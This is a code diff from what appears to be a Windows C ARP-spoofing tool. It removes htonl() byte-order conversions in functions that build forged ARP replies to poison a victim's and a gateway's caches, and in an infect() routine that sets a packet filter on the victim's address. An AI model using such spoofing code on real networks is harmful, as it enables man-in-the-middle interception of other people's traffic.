@@ -48,8 +48,8 @@ static DWORD WINAPI start_arp_spoofing(
 	/* build the packets */
 	build_packet(
 		victim_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(infect_params.victim_ip),
+		infect_params.gateway_ip,
+		infect_params.victim_ip,
 		infect_params.adapter->Address,
 		infect_params.victim_mac,
 		2
@@ -57,8 +57,8 @@ static DWORD WINAPI start_arp_spoofing(
 	
 	build_packet(
 		gateway_packet,
-		htonl(infect_params.victim_ip),
-		htonl(infect_params.gateway_ip),
+		infect_params.victim_ip,
+		infect_params.gateway_ip,
 		infect_params.adapter->Address,
 		infect_params.gateway_mac,
 		2
@@ -66,8 +66,8 @@ static DWORD WINAPI start_arp_spoofing(
 
 	build_packet(
 		rearping_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(host_ip),
+		infect_params.gateway_ip,
+		host_ip,
 		infect_params.gateway_mac,
 		infect_params.adapter->Address,
 		2
@@ -100,8 +100,8 @@ static void stop_arp_spoofing()
 	/* build the packets */
 	build_packet(
 		victim_packet,
-		htonl(infect_params.gateway_ip),
-		htonl(infect_params.victim_ip),
+		infect_params.gateway_ip,
+		infect_params.victim_ip,
 		infect_params.gateway_mac,
 		infect_params.victim_mac,
 		2
@@ -109,8 +109,8 @@ static void stop_arp_spoofing()
 
 	build_packet(
 		gateway_packet,
-		htonl(infect_params.victim_ip),
-		htonl(infect_params.gateway_ip),
+		infect_params.victim_ip,
+		infect_params.gateway_ip,
 		infect_params.victim_mac,
 		infect_params.gateway_mac,
 		2
@@ -289,7 +289,7 @@ void infect()
 	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
 	//C4-E9-84-DB-87-03
 	/* create filter */
-	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
+	n_addr.S_un.S_addr = infect_params.victim_ip;
 
 	snprintf(filter, 100, "%s %s %s %02X%02X%02X%02X%02X%02X\n", 
 		"ip host",
